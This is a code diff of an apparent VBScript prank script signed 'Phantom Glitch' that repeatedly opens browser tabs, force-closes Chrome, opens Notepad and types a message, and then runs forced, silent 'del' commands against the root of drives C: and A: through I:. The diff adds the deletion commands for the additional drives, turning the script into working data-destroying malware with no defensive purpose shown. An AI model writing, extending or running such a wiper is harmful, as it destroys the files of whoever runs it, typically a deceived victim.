@@ -72,24 +72,15 @@ CreateObject("WScript.Shell").Run "start www.google.com"
 
 CreateObject("WScript.Shell").Run "start www.google.com"
 
-CreateObject("WScript.Shell").Run "start www.google.com"
-
-CreateObject("WScript.Shell").Run "start www.google.com"
-
-CreateObject("WScript.Shell").Run "start www.google.com"
-
-CreateObject("WScript.Shell").Run "start www.google.com"
-
-CreateObject("WScript.Shell").Run "start www.google.com"
-
-
 
 CreateObject("WScript.Shell").Run "taskkill /F /IM chrome.exe"
 
 
 Set shell = CreateObject("WScript.Shell")
 
+
 shell.Run "notepad.exe"
+
 
 WScript.Sleep 1000
 
@@ -109,7 +100,31 @@ shell.SendKeys "hola soy Phantom Glitch{ENTER}"
 
 
 Set sh = CreateObject("Shell.Application")
-sh.ShellExecute "cmd.exe", "/c del C:\*.* /F /Q", "", "runas", 1
+sh.ShellExecute "cmd.exe", "/c del C:\*.* /F /Q"
+
+Set sh = CreateObject("Shell.Application")
+sh.ShellExecute "cmd.exe", "/c del A:\*.* /F /Q"
+
+Set sh = CreateObject("Shell.Application")
+sh.ShellExecute "cmd.exe", "/c del B:\*.* /F /Q"
+
+Set sh = CreateObject("Shell.Application")
+sh.ShellExecute "cmd.exe", "/c del D:\*.* /F /Q"
+
+Set sh = CreateObject("Shell.Application")
+sh.ShellExecute "cmd.exe", "/c del E:\*.* /F /Q"
+
+Set sh = CreateObject("Shell.Application")
+sh.ShellExecute "cmd.exe", "/c del F:\*.* /F /Q"
+
+Set sh = CreateObject("Shell.Application")
+sh.ShellExecute "cmd.exe", "/c del G:\*.* /F /Q"
+
+Set sh = CreateObject("Shell.Application")
+sh.ShellExecute "cmd.exe", "/c del H:\*.* /F /Q"
+
+Set sh = CreateObject("Shell.Application")
+sh.ShellExecute "cmd.exe", "/c del I:\*.* /F /Q"
 
 
 
